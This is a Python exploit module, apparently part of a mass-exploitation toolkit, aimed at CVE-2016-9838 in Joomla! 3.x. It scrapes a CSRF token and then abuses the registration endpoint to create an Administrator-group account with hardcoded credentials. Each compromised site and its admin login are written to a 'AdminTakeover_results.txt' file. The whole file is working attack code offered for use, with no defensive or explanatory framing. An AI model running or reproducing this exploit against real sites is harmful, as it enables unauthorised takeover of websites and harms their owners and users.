# coding=utf-8
import requests, re
import printModule

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'

agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}



def Exploit(site, email):
    sess = requests.Session()
    username = 'neko'
    password = 'tegal1337'
    try:
        resp = sess.get('http://' + site + "/index.php/component/users/?view=login", headers=agent, timeout=10)
        token = re.findall('<input type="hidden" name="(.*)" value="1"', str(resp.content))[0]
    except:
        return printModule.returnNo(site, 'CVE-2016-9838', 'Joomla! 3.x Add Admin', 'Joomla')
    try:
        Headers = {
            'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Referer': 'http://{}/index.php/component/users/?view=registration'.format(site),
            'Upgrade-Insecure-Requests': '1'
        }

        data = {
            'user[name]': username,
            'user[username]': username,
            'user[password1]': password,
            'user[password2]': password,
            'user[email1]': email,
            'user[email2]': email,
            'user[groups][]': '7',
            'user[activation]': '0',
            'user[block]': '0',
            'form[name]': username,
            'form[username]': username,
            'form[password1]': password,
            'form[password2]': password,
            'form[email1]': email,
            'form[email2]': email,
            'form[option]': 'com_users',
            'form[task]': 'user.register',
            token: '1',
        }


        Req = sess.post('http://' + site + "/index.php/component/users/?task=user.register",
                        data=data, timeout=10, headers=Headers)
        if 'id="system-message"' in str(Req.content):
            with open('result/AdminTakeover_results.txt', 'a') as writer:
                writer.write(site + '/administrator/index.php --> Active Link Sended to: {}\n  Username: {}\n'
                                    '  Password: {}\n------------------------------------------\n'
                             .format(email, username, password))
            return printModule.returnYes(site, 'CVE-2016-9838', 'Joomla! 3.x Add Admin', 'Joomla')
        else:
            return printModule.returnNo(site, 'CVE-2016-9838', 'Joomla! 3.x Add Admin', 'Joomla')
    except:
        return printModule.returnNo(site, 'CVE-2016-9838', 'Joomla! 3.x Add Admin', 'Joomla')
